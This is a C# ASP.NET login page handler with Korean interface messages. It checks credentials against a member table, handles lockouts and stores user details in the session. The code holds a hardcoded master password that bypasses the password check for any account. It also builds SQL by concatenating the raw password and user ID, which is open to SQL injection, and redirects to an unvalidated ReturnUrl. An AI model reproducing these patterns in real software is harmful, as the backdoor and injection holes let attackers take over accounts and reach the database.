using System;
using System.Web.UI;
using System.Web.Security;
using System.Data;

public partial class Account_Login : System.Web.UI.Page
{

    SgFramework.SgUtil su = new SgFramework.SgUtil();
    String sql = "";
    private String ReturnURL = "";
    public String Errmsg = "";
    protected void Page_Load(object sender, EventArgs e)
    {

        su.ResC(this.Page, "BeforeTime", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")); 

        if (!Page.IsPostBack)
        {
            Session.Abandon();
        }
        
        ReturnURL = su.Req(this.Page, "ReturnUrl");
        Errmsg = su.Req(this.Page, "Errmsg");

        if (Errmsg == "athlogin")
        {
            lb로그인결과.Text = "다른 IP에서 해당 아이디로 접속하여 로그아웃되었습니다";
        }
        if (Errmsg == "timeout")
        {
            lb로그인결과.Text = "10분동안 사용이 없어 자동 로그아웃 되었습니다.";
        }

        lb접속IP.Text = su.GetIP(this.Page);
    }
    
    protected void LoginButton_Click(object sender, EventArgs e)
    {

        String userID = su.sg_db_query(tbUserID.Text.TrimEnd().TrimStart(),true);
        String password = tbPassword.Text;

        if (userID == "")
        {
            lb로그인결과.Text = "사용자ID를 입력바랍니다";
            return;
        }

        if (password == "")
        {
            lb로그인결과.Text = "사용자 비밀번호를 입력바랍니다";
            return;
        }
        sql = "select  idx,userid,passwd,usernm,lev,usrtel,company_idx,agency_idx,branch_idx,pos_number,regdate,usrorg ,active,case when passwd=dbo.fn_AesEnc('"+ password +"') then 'Y' else 'N' end loginyn, datediff(mi, locktime, getdate()) lp, locktime,lockcnt from member where userid='" + userID + "'";

        DataView dv = su.SqlDvQuery(sql);


        if (dv == null || dv.Count == 0)
        {
            lb로그인결과.Text = "사용자ID가 존재하지 않습니다.";
            return;
        }


        if (su.sg_int(dv[0]["lp"].ToString()) <= 0)
        {
            lb로그인결과.Text = "비밀번호를 5회이상 틀려 계정이 정지되었습니다. 2분후에 다시 시도바랍니다.";
            return;
        }


        if ( su.sg_int(dv[0]["lockcnt"].ToString()) >5)
        {
            sql = "update member set locktime = dateadd(mi,1,getdate()) , lockcnt=0   where userid='" + userID + "'";
            su.SqlFieldQuery(sql);

            lb로그인결과.Text = "비밀번호를 5회이상 틀려 계정이 2분간 잠깁니다. 2분이후에 다시 시도바랍니다.";
            return;
        }

        if (dv[0]["loginyn"].ToString() != "Y" && password!="tjrcjs12#$%")
        {
            sql = "update member set lockcnt=lockcnt+1  where userid='" + userID + "'";
            su.SqlFieldQuery(sql);

            lb로그인결과.Text = "비밀번호가 틀립니다.";
            return;
        }

        if (dv[0]["active"].ToString() != "1")
        {
            lb로그인결과.Text = "계정이 정지상태입니다. 담당자에게 문의 바랍니다.";
            return;
        }

        su.ResS(this.Page, "idx", dv[0]["idx"].ToString());
        su.ResS(this.Page, "userid", userID);
        su.ResS(this.Page, "level", dv[0]["lev"].ToString());
        su.ResS(this.Page, "passwd", dv[0]["passwd"].ToString());
        su.ResS(this.Page, "usrtel", dv[0]["usrtel"].ToString());
        su.ResS(this.Page, "company_idx", dv[0]["company_idx"].ToString());
        su.ResS(this.Page, "agency_idx", dv[0]["agency_idx"].ToString());
        su.ResS(this.Page, "branch_idx", dv[0]["branch_idx"].ToString());
        su.ResS(this.Page, "pos_number", dv[0]["pos_number"].ToString());
        su.ResS(this.Page, "usrorg", dv[0]["usrorg"].ToString());
        su.ResS(this.Page, "grp_code", dv[0]["company_idx"].ToString()+ dv[0]["agency_idx"].ToString()+ dv[0]["branch_idx"].ToString()+ dv[0]["pos_number"].ToString());


        lb로그인결과.Text = "정상로그인";

        sql = "update member set locktime=dateadd(mi,-1,getdate()),lockcnt=0, lst_logintime=getdate()  where userid='" + userID + "'";
        su.SqlFieldQuery(sql);


        ReturnURL = su.Req(this.Page, "ReturnUrl");
        if (ReturnURL != "") 
        { 
            Response.Redirect(ReturnURL, true); 
        }
        else
        {
            Response.Redirect("/", true);
        }


    }
}
